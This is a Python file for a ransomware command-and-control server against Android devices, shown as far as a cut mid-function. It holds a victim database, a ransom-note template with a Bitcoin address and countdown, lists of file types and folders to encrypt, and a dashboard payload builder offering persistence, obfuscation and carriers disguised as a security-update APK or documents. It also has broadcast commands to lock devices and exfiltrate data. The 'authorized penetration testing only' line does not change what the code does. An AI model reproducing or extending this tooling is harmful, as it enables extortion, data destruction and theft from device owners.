#!/usr/bin/env python3
"""
SET C2 Server - Sophisticated Encryption Toolkit
State-of-the-art ransomware C2 with real-time WebSocket control.
Authorized penetration testing only.
"""

import os
import sys
import json
import time
import uuid
import ssl
import sqlite3
import base64
import hashlib
import hmac
import secrets
import logging
import threading
import queue
from datetime import datetime, timedelta
from pathlib import Path
from typing import Optional, Dict, List, Any
from http import HTTPStatus

try:
    from flask import (
        Flask, request, jsonify, redirect, url_for,
        render_template_string, send_file, session, abort
    )
    from flask_socketio import SocketIO, emit, join_room, disconnect
    import eventlet
    eventlet.monkey_patch()
except ImportError:
    print("[!] Required: pip install flask flask-socketio eventlet cryptography")
    sys.exit(1)

# ============================================================
# LOGGING - Silent, file-based only
# ============================================================
LOG_FILE = Path(__file__).parent / "set_c2.log"
logging.basicConfig(
    level=logging.WARNING,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.NullHandler()  # Suppress console in production
    ]
)
log = logging.getLogger("SET-C2")

# ============================================================
# DATABASE - Victim tracking
# ============================================================
DB_PATH = Path(__file__).parent / "set_c2.db"

def init_db():
    conn = sqlite3.connect(str(DB_PATH))
    c = conn.cursor()
    c.executescript("""
        CREATE TABLE IF NOT EXISTS victims (
            id TEXT PRIMARY KEY,
            device_name TEXT,
            android_version TEXT,
            manufacturer TEXT,
            model TEXT,
            sdk_level INTEGER,
            ip TEXT,
            first_seen TEXT,
            last_seen TEXT,
            status TEXT DEFAULT 'active',
            lock_mode TEXT DEFAULT 'none',
            ransom_paid INTEGER DEFAULT 0,
            notes TEXT
        );
        CREATE TABLE IF NOT EXISTS commands (
            id TEXT PRIMARY KEY,
            victim_id TEXT,
            command TEXT,
            params TEXT,
            status TEXT DEFAULT 'pending',
            issued_at TEXT,
            executed_at TEXT,
            result TEXT,
            FOREIGN KEY(victim_id) REFERENCES victims(id)
        );
        CREATE TABLE IF NOT EXISTS events (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            victim_id TEXT,
            event_type TEXT,
            details TEXT,
            timestamp TEXT,
            FOREIGN KEY(victim_id) REFERENCES victims(id)
        );
        CREATE TABLE IF NOT EXISTS config (
            key TEXT PRIMARY KEY,
            value TEXT
        );
    """)
    # Default config
    defaults = {
        "c2_port": "8443",
        "use_ssl": "true",
        "ransom_note_template": json.dumps({
            "title": "YOUR DEVICE HAS BEEN LOCKED",
            "message": "All your files have been encrypted with AES-256-GCM.\nContact us for decryption.",
            "amount_btc": 0.5,
            "btc_address": "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh",
            "email": "support@onionmail.com",
            "timer_hours": 72,
            "background_color": "#8B0000",
            "text_color": "#FFFFFF"
        }),
        "default_lock_mode": "files",
        "encrypt_extensions": json.dumps([
            ".txt", ".doc", ".docx", ".xls", ".xlsx", ".pdf",
            ".jpg", ".jpeg", ".png", ".gif", ".mp4", ".mp3",
            ".zip", ".rar", ".7z", ".db", ".sqlite", ".csv",
            ".ppt", ".pptx", ".odt", ".ods", ".odp", ".rtf",
            ".html", ".htm", ".php", ".js", ".py", ".sql"
        ]),
        "target_dirs": json.dumps([
            "/sdcard/Documents",
            "/sdcard/Download",
            "/sdcard/Pictures",
            "/sdcard/DCIM",
            "/sdcard/Music",
            "/sdcard/Movies",
            "/sdcard/Android/media"
        ])
    }
    for k, v in defaults.items():
        c.execute("INSERT OR IGNORE INTO config (key, value) VALUES (?, ?)", (k, v))
    conn.commit()
    conn.close()

init_db()

# ============================================================
# HELPER FUNCTIONS
# ============================================================

def get_config(key: str, default=None) -> str:
    conn = sqlite3.connect(str(DB_PATH))
    c = conn.cursor()
    c.execute("SELECT value FROM config WHERE key=?", (key,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else default

def set_config(key: str, value: str):
    conn = sqlite3.connect(str(DB_PATH))
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO config (key, value) VALUES (?, ?)", (key, value))
    conn.commit()
    conn.close()

def get_victim(victim_id: str) -> Optional[Dict]:
    conn = sqlite3.connect(str(DB_PATH))
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute("SELECT * FROM victims WHERE id=?", (victim_id,))
    row = c.fetchone()
    conn.close()
    return dict(row) if row else None

def get_all_victims() -> List[Dict]:
    conn = sqlite3.connect(str(DB_PATH))
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute("SELECT * FROM victims ORDER BY last_seen DESC")
    rows = [dict(r) for r in c.fetchall()]
    conn.close()
    return rows

def add_event(victim_id: str, event_type: str, details: str):
    conn = sqlite3.connect(str(DB_PATH))
    c = conn.cursor()
    c.execute(
        "INSERT INTO events (victim_id, event_type, details, timestamp) VALUES (?, ?, ?, ?)",
        (victim_id, event_type, details, datetime.utcnow().isoformat())
    )
    conn.commit()
    conn.close()

def get_victim_events(victim_id: str, limit: int = 100) -> List[Dict]:
    conn = sqlite3.connect(str(DB_PATH))
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute(
        "SELECT * FROM events WHERE victim_id=? ORDER BY timestamp DESC LIMIT ?",
        (victim_id, limit)
    )
    rows = [dict(r) for r in c.fetchall()]
    conn.close()
    return rows

def issue_command(victim_id: str, command: str, params: Dict = None) -> str:
    cmd_id = str(uuid.uuid4())
    conn = sqlite3.connect(str(DB_PATH))
    c = conn.cursor()
    c.execute(
        "INSERT INTO commands (id, victim_id, command, params, status, issued_at) VALUES (?, ?, ?, ?, 'pending', ?)",
        (cmd_id, victim_id, command, json.dumps(params or {}), datetime.utcnow().isoformat())
    )
    conn.commit()
    conn.close()
    return cmd_id

def get_pending_commands(victim_id: str) -> List[Dict]:
    conn = sqlite3.connect(str(DB_PATH))
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute(
        "SELECT * FROM commands WHERE victim_id=? AND status='pending' ORDER BY issued_at ASC",
        (victim_id,)
    )
    rows = [dict(r) for r in c.fetchall()]
    conn.close()
    return rows

def mark_command_executed(cmd_id: str, result: str = None):
    conn = sqlite3.connect(str(DB_PATH))
    c = conn.cursor()
    c.execute(
        "UPDATE commands SET status='executed', executed_at=?, result=? WHERE id=?",
        (datetime.utcnow().isoformat(), result, cmd_id)
    )
    conn.commit()
    conn.close()

# ============================================================
# SSL CERTIFICATE GENERATION
# ============================================================

def generate_self_signed_cert(cert_path: Path, key_path: Path):
    """Generate self-signed cert for HTTPS C2."""
    from cryptography import x509
    from cryptography.x509.oid import NameOID
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa

    key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
    )

    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, "SET-C2"),
        x509.NameAttribute(NameOID.COMMON_NAME, "set-c2.local"),
    ])

    cert = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(datetime.utcnow())
        .not_valid_after(datetime.utcnow() + timedelta(days=365))
        .add_extension(
            x509.SubjectAlternativeName([x509.DNSName("localhost")]),
            critical=False,
        )
        .sign(key, hashes.SHA256())
    )

    with open(key_path, "wb") as f:
        f.write(key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption(),
        ))
    with open(cert_path, "wb") as f:
        f.write(cert.public_bytes(serialization.Encoding.PEM))

    log.info(f"Self-signed cert generated: {cert_path}")

# ============================================================
# FLASK APPLICATION
# ============================================================

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")

# Track connected victims: sid -> {victim_id, device_info}
connected_victims: Dict[str, Dict] = {}
# Track connected admin browsers: sid -> admin_session
admin_sessions: Dict[str, bool] = {}

# ============================================================
# WEB INTERFACE - Embedded HTML/CSS/JS Templates
# ============================================================

# We'll define templates as Python strings for single-file deployment.

INDEX_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SET C2 Dashboard</title>
<script src="https://cdn.socket.io/4.6.0/socket.io.min.js"></script>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
:root {
  --bg: #0a0e17;
  --bg2: #111827;
  --bg3: #1a2332;
  --primary: #00f5d4;
  --primary-dim: rgba(0,245,212,0.15);
  --danger: #ff3355;
  --warning: #ffaa33;
  --success: #33ffaa;
  --text: #e2e8f0;
  --text-dim: #8892b0;
  --border: #1e2d3d;
  --radius: 8px;
}
body {
  font-family: 'Segoe UI','SF Pro Display',system-ui,-apple-system,sans-serif;
  background: var(--bg);
  color: var(--text);
  min-height: 100vh;
  display: flex;
}
::-webkit-scrollbar { width: 6px; }
::-webkit-scrollbar-track { background: var(--bg2); }
::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
/* Sidebar */
.sidebar {
  width: 260px;
  background: var(--bg2);
  border-right: 1px solid var(--border);
  padding: 24px 16px;
  display: flex;
  flex-direction: column;
  flex-shrink: 0;
}
.sidebar .logo {
  font-size: 24px;
  font-weight: 800;
  letter-spacing: -0.5px;
  margin-bottom: 32px;
}
.sidebar .logo span { color: var(--primary); }
.sidebar nav { display: flex; flex-direction: column; gap: 4px; }
.sidebar nav a {
  padding: 10px 14px;
  border-radius: var(--radius);
  color: var(--text-dim);
  text-decoration: none;
  font-size: 14px;
  font-weight: 500;
  transition: all 0.2s;
  display: flex;
  align-items: center;
  gap: 10px;
}
.sidebar nav a:hover, .sidebar nav a.active {
  background: var(--primary-dim);
  color: var(--primary);
}
.sidebar .stats-box {
  margin-top: auto;
  padding: 16px;
  background: var(--bg3);
  border-radius: var(--radius);
  font-size: 13px;
}
.sidebar .stats-box .stat { display: flex; justify-content: space-between; margin: 4px 0; }
.sidebar .stats-box .stat .label { color: var(--text-dim); }
.sidebar .stats-box .stat .value { color: var(--primary); font-weight: 600; }
/* Main */
.main {
  flex: 1;
  padding: 24px 32px;
  overflow-y: auto;
  max-height: 100vh;
}
.header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 24px;
}
.header h1 { font-size: 28px; font-weight: 700; }
.header .subtitle { color: var(--text-dim); font-size: 14px; }
/* Cards */
.cards { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 16px; margin-bottom: 24px; }
.card {
  background: var(--bg2);
  border: 1px solid var(--border);
  border-radius: var(--radius);
  padding: 20px;
}
.card .card-label { font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; color: var(--text-dim); margin-bottom: 6px; }
.card .card-value { font-size: 28px; font-weight: 700; }
.card .card-value.danger { color: var(--danger); }
.card .card-value.success { color: var(--success); }
.card .card-value.warning { color: var(--warning); }
.card .card-value.primary { color: var(--primary); }
/* Tables */
.table-container { background: var(--bg2); border: 1px solid var(--border); border-radius: var(--radius); overflow: hidden; }
table { width: 100%; border-collapse: collapse; }
thead { background: var(--bg3); }
th { padding: 12px 16px; text-align: left; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; color: var(--text-dim); font-weight: 600; }
td { padding: 12px 16px; border-top: 1px solid var(--border); font-size: 14px; }
tbody tr { transition: background 0.15s; cursor: pointer; }
tbody tr:hover { background: var(--primary-dim); }
.status-badge {
  display: inline-block;
  padding: 3px 10px;
  border-radius: 12px;
  font-size: 11px;
  font-weight: 600;
  text-transform: uppercase;
  letter-spacing: 0.3px;
}
.status-badge.active { background: rgba(0,245,212,0.15); color: var(--primary); }
.status-badge.locked { background: rgba(255,51,85,0.15); color: var(--danger); }
.status-badge.pending { background: rgba(255,170,51,0.15); color: var(--warning); }
.status-badge.paid { background: rgba(51,255,170,0.15); color: var(--success); }
.status-badge.offline { background: rgba(136,146,176,0.15); color: var(--text-dim); }
/* Buttons */
.btn {
  padding: 8px 16px;
  border: none;
  border-radius: var(--radius);
  font-size: 13px;
  font-weight: 600;
  cursor: pointer;
  transition: all 0.2s;
}
.btn-primary { background: var(--primary); color: #000; }
.btn-primary:hover { opacity: 0.85; }
.btn-danger { background: var(--danger); color: #fff; }
.btn-danger:hover { opacity: 0.85; }
.btn-sm { padding: 5px 10px; font-size: 11px; }
.btn-ghost { background: transparent; color: var(--text-dim); border: 1px solid var(--border); }
.btn-ghost:hover { background: var(--bg3); color: var(--text); }
/* Modal */
.modal-overlay {
  display: none;
  position: fixed;
  top: 0; left: 0; right: 0; bottom: 0;
  background: rgba(0,0,0,0.7);
  backdrop-filter: blur(4px);
  z-index: 1000;
  align-items: center;
  justify-content: center;
}
.modal-overlay.active { display: flex; }
.modal {
  background: var(--bg2);
  border: 1px solid var(--border);
  border-radius: 12px;
  padding: 24px;
  width: 560px;
  max-width: 90vw;
  max-height: 85vh;
  overflow-y: auto;
}
.modal h2 { margin-bottom: 16px; font-size: 20px; }
.modal .form-group { margin-bottom: 14px; }
.modal label { display: block; font-size: 13px; color: var(--text-dim); margin-bottom: 4px; font-weight: 500; }
.modal input, .modal select, .modal textarea {
  width: 100%;
  padding: 10px 12px;
  background: var(--bg3);
  border: 1px solid var(--border);
  border-radius: var(--radius);
  color: var(--text);
  font-size: 14px;
}
.modal textarea { min-height: 80px; resize: vertical; font-family: monospace; }
.modal .btn-row { display: flex; gap: 8px; justify-content: flex-end; margin-top: 16px; }
/* Live log */
.log-viewer {
  background: #000;
  border: 1px solid var(--border);
  border-radius: var(--radius);
  padding: 12px;
  max-height: 300px;
  overflow-y: auto;
  font-family: 'JetBrains Mono','Fira Code',monospace;
  font-size: 12px;
  line-height: 1.6;
}
.log-viewer .log-entry { color: var(--text-dim); }
.log-viewer .log-entry.info { color: var(--primary); }
.log-viewer .log-entry.warn { color: var(--warning); }
.log-viewer .log-entry.error { color: var(--danger); }
.log-viewer .log-entry.system { color: #8888ff; }
.tab-bar { display: flex; gap: 2px; margin-bottom: 16px; background: var(--bg3); border-radius: var(--radius); padding: 2px; }
.tab-bar .tab {
  padding: 8px 18px;
  border: none;
  background: transparent;
  color: var(--text-dim);
  font-size: 13px;
  font-weight: 500;
  cursor: pointer;
  border-radius: 6px;
  transition: all 0.2s;
}
.tab-bar .tab.active { background: var(--primary); color: #000; }
.tab-bar .tab:hover:not(.active) { color: var(--text); }
.hidden { display: none; }
.flex { display: flex; }
.gap-2 { gap: 8px; }
.gap-4 { gap: 16px; }
.items-center { align-items: center; }
.justify-between { justify-content: space-between; }
.mb-4 { margin-bottom: 16px; }
.mt-4 { margin-top: 16px; }
.text-sm { font-size: 13px; }
.text-dim { color: var(--text-dim); }
.grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
@media (max-width: 768px) {
  .sidebar { display: none; }
  .main { padding: 16px; }
  .grid-2 { grid-template-columns: 1fr; }
}
</style>
</head>
<body>

<div class="sidebar">
  <div class="logo"><span>SET</span> C2</div>
  <nav>
    <a href="#" class="active" data-page="dashboard">📊 Dashboard</a>
    <a href="#" data-page="victims">🎯 Victims</a>
    <a href="#" data-page="builder">📦 Builder</a>
    <a href="#" data-page="config">⚙️ Config</a>
  </nav>
  <div class="stats-box" id="sidebarStats">
    <div class="stat"><span class="label">Online</span><span class="value" id="statOnline">0</span></div>
    <div class="stat"><span class="label">Total Victims</span><span class="value" id="statTotal">0</span></div>
    <div class="stat"><span class="label">Locked</span><span class="value" style="color:var(--danger)" id="statLocked">0</span></div>
    <div class="stat"><span class="label">Paid</span><span class="value" style="color:var(--success)" id="statPaid">0</span></div>
  </div>
</div>

<div class="main">
  <!-- HEADER -->
  <div class="header">
    <div>
      <h1 id="pageTitle">Dashboard</h1>
      <div class="subtitle" id="pageSubtitle">Real-time command & control center</div>
    </div>
    <div class="flex gap-2 items-center">
      <span class="text-sm text-dim" id="connectionStatus">● Connecting...</span>
    </div>
  </div>

  <!-- PAGE: DASHBOARD -->
  <div id="page-dashboard">
    <div class="cards" id="dashboardCards">
      <div class="card"><div class="card-label">Victims Online</div><div class="card-value primary" id="dashOnline">0</div></div>
      <div class="card"><div class="card-label">Total Infected</div><div class="card-value" id="dashTotal">0</div></div>
      <div class="card"><div class="card-label">Currently Locked</div><div class="card-value danger" id="dashLocked">0</div></div>
      <div class="card"><div class="card-label">Ransom Paid</div><div class="card-value success" id="dashPaid">0</div></div>
    </div>
    <div class="mb-4">
      <div class="tab-bar">
        <button class="tab active" data-tab="recent">Recent Activity</button>
        <button class="tab" data-tab="live">Live Log</button>
      </div>
      <div id="tab-recent">
        <div class="table-container">
          <table>
            <thead><tr><th>Victim</th><th>Event</th><th>Details</th><th>Time</th></tr></thead>
            <tbody id="recentEvents"></tbody>
          </table>
        </div>
      </div>
      <div id="tab-live" class="hidden">
        <div class="log-viewer" id="liveLog"></div>
      </div>
    </div>
  </div>

  <!-- PAGE: VICTIMS -->
  <div id="page-victims" class="hidden">
    <div class="table-container">
      <table>
        <thead>
          <tr>
            <th>Victim ID</th><th>Device</th><th>Android</th><th>IP</th>
            <th>Status</th><th>Lock Mode</th><th>Last Seen</th><th>Actions</th>
          </tr>
        </thead>
        <tbody id="victimsTable"></tbody>
      </table>
    </div>
  </div>

  <!-- PAGE: BUILDER -->
  <div id="page-builder" class="hidden">
    <div class="grid-2">
      <div class="card">
        <h3 class="mb-4">📦 Payload Builder</h3>
        <div class="form-group">
          <label>C2 Server Host</label>
          <input type="text" id="builderHost" value="localhost" placeholder="Your C2 server IP/domain">
        </div>
        <div class="form-group">
          <label>C2 Port</label>
          <input type="number" id="builderPort" value="8443">
        </div>
        <div class="form-group">
          <label>Use SSL</label>
          <select id="builderSSL"><option value="true">Yes (HTTPS/WSS)</option><option value="false">No (HTTP/WS)</option></select>
        </div>
        <div class="form-group">
          <label>Default Lock Mode</label>
          <select id="builderLockMode">
            <option value="files">Files Only</option>
            <option value="screen">Screen Lock</option>
            <option value="full">Full Device Lock</option>
            <option value="sensors">Sensor Block</option>
            <option value="apps">App Lock</option>
          </select>
        </div>
        <div class="form-group">
          <label>Persistence Level</label>
          <select id="builderPersist">
            <option value="none">None (Single-run)</option>
            <option value="service">Foreground Service</option>
            <option value="boot">Boot Receiver</option>
            <option value="device_admin">Device Admin + Boot</option>
          </select>
        </div>
        <div class="form-group">
          <label>Obfuscation Level</label>
          <select id="builderObfuscation">
            <option value="none">None</option>
            <option value="base64">Base64 Encode</option>
            <option value="xor">XOR + Base64</option>
            <option value="aes">AES Encrypted Stager</option>
          </select>
        </div>
        <div class="form-group">
          <label>Carrier Document Type</label>
          <select id="builderCarrier">
            <option value="apk">APK (Android App)</option>
            <option value="pdf">PDF Document</option>
            <option value="docx">Word Document</option>
            <option value="xlsx">Excel Spreadsheet</option>
            <option value="image">Image (JPG/PNG)</option>
          </select>
        </div>
        <div class="form-group">
          <label>Carrier Name (shown to victim)</label>
          <input type="text" id="builderName" value="Security_Update_July_2026.apk">
        </div>
        <button class="btn btn-primary" onclick="buildPayload()">🔨 Generate Payload</button>
        <div id="builderResult" class="mt-4 hidden">
          <div class="text-sm text-dim">Payload ready:</div>
          <a href="#" id="builderDownloadLink" class="btn btn-primary btn-sm mt-4">⬇ Download Payload</a>
          <pre id="builderPayloadCode" class="mt-4" style="background:#000;padding:12px;border-radius:8px;font-size:11px;max-height:400px;overflow:auto;"></pre>
        </div>
      </div>
      <div class="card">
        <h3 class="mb-4">⚡ Quick Commands</h3>
        <p class="text-sm text-dim mb-4">Broadcast a command to all active victims</p>
        <div class="form-group">
          <label>Select All Victims</label>
          <select id="broadcastVictim">
            <option value="__ALL__">All Active Victims</option>
          </select>
        </div>
        <div class="form-group">
          <label>Command</label>
          <select id="broadcastCmd">
            <option value="lock_files">🔒 Lock Files</option>
            <option value="lock_screen">📱 Lock Screen (Overlay)</option>
            <option value="lock_full">⛔ Full Device Lock</option>
            <option value="lock_apps">📲 Lock Apps</option>
            <option value="lock_sensors">📡 Disable Sensors</option>
            <option value="unlock">🔓 Unlock / Decrypt</option>
            <option value="status">📊 Get Status</option>
            <option value="exfil">📤 Exfiltrate Data</option>
          </select>
        </div>
        <button class="btn btn-danger" onclick="broadcastCommand()">🚀 Execute Command</button>
      </div>
    </div>
  </div>

  <!-- PAGE: CONFIG -->
  <div id="page-config" class="hidden">
    <div class="grid-2">
      <div class="card">
        <h3 class="mb-4">🎭 Ransom Note Configuration</h3>
        <div class="form-group">
          <label>Title</label>
          <input type="text" id="cfgTitle" value="YOUR DEVICE HAS BEEN LOCKED">
        </div>
        <div class="form-group">
          <label>Message</label>
          <textarea id="cfgMessage" rows="3">All your files have been encrypted with AES-256-GCM.
Contact us for decryption instructions.</textarea>
        </div>
        <div class="form-group">
          <label>Bitcoin Amount</label>
          <input type="number" id="cfgBtcAmount" value="0.5" step="0.01">
        </div>
        <div class="form-group">
          <label>Bitcoin Address</label>
          <input type="text" id="cfgBtcAddr" value="bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh">
        </div>
        <div class="form-group">
          <label>Contact Email</label>
          <input type="text" id="cfgEmail" value="support@onionmail.com">
        </div>
        <div class="form-group">
          <label>Timer (Hours)</label>
          <input type="number" id="cfgTimer" value="72">
        </div>
        <button class="btn btn-primary" onclick="saveRansomConfig()">Save Ransom Config</button>
      </div>
      <div class="card">
        <h3 class="mb-4">🔐 Encryption Target Config</h3>
        <div class="form-group">
          <label>Target File Extensions (JSON array)</label>
          <textarea id="cfgExtensions" rows="4">[".txt",".doc",".docx",".xls",".xlsx",".pdf",".jpg",".jpeg",".png",".gif",".mp4",".mp3",".zip",".rar",".7z",".db",".sqlite",".csv",".ppt",".pptx",".odt",".ods",".odp",".rtf",".html",".htm",".php",".js",".py",".sql"]</textarea>
        </div>
        <div class="form-group">
          <label>Target Directories (JSON array)</label>
          <textarea id="cfgDirs" rows="3">["/sdcard/Documents","/sdcard/Download","/sdcard/Pictures","/sdcard/DCIM","/sdcard/Music","/sdcard/Movies"]</textarea>
        </div>
        <div class="form-group">
          <label>Default Lock Mode</label>
          <select id="cfgLockMode">
            <option value="files">Files Only</option>
            <option value="screen">Screen Lock</option>
            <option value="full">Full Device Lock</option>
            <option value="sensors">Sensor Block</option>
            <option value="apps">App Lock</option>
          </select>
        </div>
        <button class="btn btn-primary" onclick="saveTargetConfig()">Save Target Config</button>
      </div>
    </div>
  </div>

</div>

<!-- VICTIM DETAIL MODAL -->
<div class="modal-overlay" id="victimModal">
  <div class="modal">
    <h2>🎯 Victim Details</h2>
    <div id="victimDetailContent"></div>
    <div class="form-group">
      <label>Send Command</label>
      <select id="modalCmd">
        <option value="lock_files">🔒 Lock Files</option>
        <option value="lock_screen">📱 Lock Screen</option>
        <option value="lock_full">⛔ Full Lock</option>
        <option value="lock_apps">📲 Lock Apps</option>
        <option value="lock_sensors">📡 Disable Sensors</option>
        <option value="unlock">🔓 Unlock/Decrypt</option>
        <option value="status">📊 Get Status</option>
        <option value="exfil">📤 Exfiltrate</option>
      </select>
    </div>
    <div class="btn-row">
      <button class="btn btn-ghost" onclick="closeVictimModal()">Close</button>
      <button class="btn btn-danger" onclick="sendCommandToVictim()">Send Command</button>
    </div>
    <div class="mt-4">
      <h4>Event Log</h4>
      <div class="log-viewer" id="victimEventLog" style="max-height:200px;margin-top:8px;"></div>
    </div>
  </div>
</div>

<script>
const socket = io(window.location.origin, {
  transports: ['websocket', 'polling'],
  reconnection: true,
  reconnectionDelay: 1000,
  reconnectionAttempts: Infinity
});

let currentVictimId = null;
let victims = {};

// Connection status
socket.on('connect', () => {
  document.getElementById('connectionStatus').textContent = '● Connected';
  document.getElementById('connectionStatus').style.color = 'var(--success)';
});
socket.on('disconnect', () => {
  document.getElementById('connectionStatus').textContent = '● Disconnected';
  document.getElementById('connectionStatus').style.color = 'var(--danger)';
});

// Real-time victim updates
socket.on('victim_update', (data) => {
  victims[data.id] = data;
  updateVictimsTable();
  updateDashboardStats();
  updateSidebarStats();
  addLogEntry(data.id + ' status: ' + data.status, 'info');
});

socket.on('victim_event', (data) => {
  addRecentEvent(data);
  addLogEntry(data.details || data.event_type, data.event_type === 'error' ? 'error' : 'info');
});

socket.on('command_result', (data) => {
  addLogEntry('Command ' + data.command + ' on ' + data.victim_id + ': ' + (data.result || 'done'), 'system');
  if (currentVictimId === data.victim_id) loadVictimEvents(data.victim_id);
});

socket.on('initial_state', (data) => {
  victims = data.victims || {};
  updateVictimsTable();
  updateDashboardStats();
  updateSidebarStats();
  data.events?.forEach(e => addRecentEvent(e));
  // Populate broadcast victim select
  const sel = document.getElementById('broadcastVictim');
  sel.innerHTML = '<option value="__ALL__">All Active Victims</option>';
  Object.values(victims).forEach(v => {
    const opt = document.createElement('option');
    opt.value = v.id;
    opt.textContent = v.id.slice(0,8)+'... - '+v.device_name;
    sel.appendChild(opt);
  });
});

// Page navigation
document.querySelectorAll('.sidebar nav a').forEach(a => {
  a.addEventListener('click', (e) => {
    e.preventDefault();
    document.querySelectorAll('.sidebar nav a').forEach(x => x.classList.remove('active'));
    a.classList.add('active');
    const page = a.dataset.page;
    document.querySelectorAll('.main > div[id^="page-"]').forEach(p => p.classList.add('hidden'));
    document.getElementById('page-'+page).classList.remove('hidden');
    document.getElementById('pageTitle').textContent = a.textContent.trim();
    if (page === 'config') loadConfig();
    if (page === 'victims') updateVictimsTable();
  });
});

// Tab switching
document.querySelectorAll('.tab-bar .tab').forEach(tab => {
  tab.addEventListener('click', () => {
    document.querySelectorAll('.tab-bar .tab').forEach(t => t.classList.remove('active'));
    tab.classList.add('active');
    const tabId = tab.dataset.tab;
    document.querySelectorAll('[id^="tab-"]').forEach(t => t.classList.add('hidden'));
    document.getElementById('tab-'+tabId).classList.remove('hidden');
  });
});

function updateVictimsTable() {
  const tbody = document.getElementById('victimsTable');
  const vals = Object.values(victims);
  if (vals.length === 0) {
    tbody.innerHTML = '<tr><td colspan="8" style="text-align:center;padding:32px;color:var(--text-dim)">No victims yet. Deploy a payload to get started.</td></tr>';
    return;
  }
  tbody.innerHTML = vals.map(v => {
    const statusClass = v.status === 'locked' ? 'locked' : (v.status === 'paid' ? 'paid' : (v.status === 'active' ? 'active' : 'offline'));
    const lockIcon = v.lock_mode === 'files' ? '🔒' : (v.lock_mode === 'screen' ? '📱' : (v.lock_mode === 'full' ? '⛔' : (v.lock_mode === 'sensors' ? '📡' : (v.lock_mode === 'apps' ? '📲' : '○'))));
    return `<tr onclick="openVictimModal('${v.id}')">
      <td style="font-family:monospace;font-size:12px">${v.id.slice(0,8)}...</td>
      <td>${v.device_name || 'Unknown'}</td>
      <td>${v.android_version || '?'} (SDK ${v.sdk_level || '?'})</td>
      <td>${v.ip || '?'}</td>
      <td><span class="status-badge ${statusClass}">${v.status}</span></td>
      <td>${lockIcon} ${v.lock_mode}</td>
      <td style="font-size:12px;color:var(--text-dim)">${v.last_seen ? new Date(v.last_seen).toLocaleString() : '?'}</td>
      <td><button class="btn btn-sm btn-ghost" onclick="event.stopPropagation();openVictimModal('${v.id}')">Details</button></td>
    </tr>`;
  }).join('');
}

function updateDashboardStats() {
  const vals = Object.values(victims);
  document.getElementById('dashOnline').textContent = vals.filter(v => v.status === 'active' || v.status === 'locked').length;
  document.getElementById('dashTotal').textContent = vals.length;
  document.getElementById('dashLocked').textContent = vals.filter(v => v.status === 'locked').length;
  document.getElementById('dashPaid').textContent = vals.filter(v => v.status === 'paid').length;
}

function updateSidebarStats() {
  const vals = Object.values(victims);
  document.getElementById('statOnline').textContent = vals.filter(v => v.status === 'active' || v.status === 'locked').length;
  document.getElementById('statTotal').textContent = vals.length;
  document.getElementById('statLocked').textContent = vals.filter(v => v.status === 'locked').length;
  document.getElementById('statPaid').textContent = vals.filter(v => v.status === 'paid').length;
}

function addRecentEvent(event) {
  const tbody = document.getElementById('recentEvents');
  const tr = document.createElement('tr');
  tr.innerHTML = `<td style="font-family:monospace;font-size:12px">${event.victim_id?.slice(0,8)||'?'}...</td>
    <td>${event.event_type}</td>
    <td>${event.details || ''}</td>
    <td style="font-size:12px;color:var(--text-dim)">${event.timestamp ? new Date(event.timestamp).toLocaleString() : '?'}</td>`;
  tbody.prepend(tr);
  while (tbody.children.length > 50) tbody.removeChild(tbody.lastChild);
}

function addLogEntry(text, type = 'info') {
  const log = document.getElementById('liveLog');
  const entry = document.createElement('div');
  entry.className = 'log-entry ' + type;
  entry.textContent = '[' + new Date().toLocaleTimeString() + '] ' + text;
  log.appendChild(entry);
  log.scrollTop = log.scrollHeight;
  while (log.children.length > 200) log.removeChild(log.firstChild);
}

function openVictimModal(id) {
  currentVictimId = id;
  const v = victims[id];
  if (!v) return;
  document.getElementById('victimDetailContent').innerHTML = `
    <div class="grid-2">
      <div><strong>ID:</strong><br><span style="font-family:monospace;font-size:12px">${v.id}</span></div>
      <div><strong>Device:</strong><br>${v.device_name || 'Unknown'} (${v.manufacturer||'?'} ${v.model||'?'})</div>
      <div><strong>Android:</strong><br>${v.android_version||'?'} (SDK ${v.sdk_level||'?'})</div>
      <div><strong>IP:</strong><br>${v.ip || '?'}</div>
      <div><strong>Status:</strong><br><span class="status-badge ${v.status}">${v.status}</span></div>
      <div><strong>Lock Mode:</strong><br>${v.lock_mode || 'none'}</div>
      <div><strong>First Seen:</strong><br>${v.first_seen ? new Date(v.first_seen).toLocaleString() : '?'}</div>
      <div><strong>Last Seen:</strong><br>${v.last_seen ? new Date(v.last_seen).toLocaleString() : '?'}</div>
    </div>
    <div class="mt-4"><strong>Ransom Paid:</strong> ${v.ransom_paid ? '✅ YES' : '❌ NO'}</div>
  `;
  document.getElementById('victimModal').classList.add('active');
  loadVictimEvents(id);
}

function closeVictimModal() {
